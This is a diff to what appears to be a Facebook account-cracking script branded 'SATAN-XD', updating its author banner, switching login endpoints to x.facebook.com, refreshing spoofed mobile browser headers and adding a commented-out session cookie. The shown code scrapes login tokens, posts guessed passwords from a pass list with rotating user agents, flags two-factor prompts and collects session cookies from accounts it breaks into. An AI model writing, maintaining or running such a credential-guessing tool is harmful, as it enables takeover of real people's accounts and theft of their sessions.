@@ -125,7 +125,7 @@ logo=("""\033[1;37m
  `8888Y' YP   YP    YP    YP   YP VP   V8P         
          \033[1;37m[\033[92;1mSATAN \033[92;1mNAAM \033[92;1mTU \033[92;1mSUNA \033[92;1mHOGA\033[1;37m]
 \033[1;37m-----------------------------------------------
-\033[1;37m AUTHOR    : SATAN \033[92;1m•
+\033[1;37m AUTHOR    : KIT \033[92;1m•
 \033[1;37m GITHUB    : NOT FOUND
 \033[1;37m VERSION   : \033[92;1m3\033[92;1m.\033[92;1m4 
 \033[1;37m═══════════════════════════════════════════════
@@ -587,7 +587,7 @@ def bd1(ids,passlist):
             session = requests.Session()
             sys.stdout.write('\r\r\033[1;37m [\x1b[1;92mSATAN\x1b[1;92m-\x1b[1;92mXD\x1b[1;97m] %s|\033[1;37mOK|%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()	            
             pro = random.choice(S1())            
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -614,15 +614,15 @@ def bd1(ids,passlist):
             'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
             'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'origin': 'https://mbasic.facebook.com',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-prefers-color-scheme': 'dark',
-            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
-            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
+           # 'cookie': 'datr=CRtoZS2lTqNhCbv0kaV5JJjr; sb=CRtoZbw6xK7dOu8CKUxWnbEf; m_pixel_ratio=1.6011383533477783; wd=450x859; fr=0UCMZWW6gwRWZXoqy..BlaBsJ.rZ.AAA.0.0.BlaBsf.AWWfbqkTx6Y',
+            'dpr': '2',
+            'sec-ch-prefers-color-scheme': 'light',
+            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.61"',
             'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-model': '"vivo 1906"',
             'sec-ch-ua-platform': '"Android"',
-            'sec-ch-ua-platform-version': '"13.0.0"',
+            'sec-ch-ua-platform-version': '"11.0.0"',
             'sec-fetch-dest': 'document',
             'sec-fetch-mode': 'navigate',
             'sec-fetch-site': 'none',
@@ -630,7 +630,7 @@ def bd1(ids,passlist):
             'upgrade-insecure-requests': '1',
             'user-agent': pro}
             twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
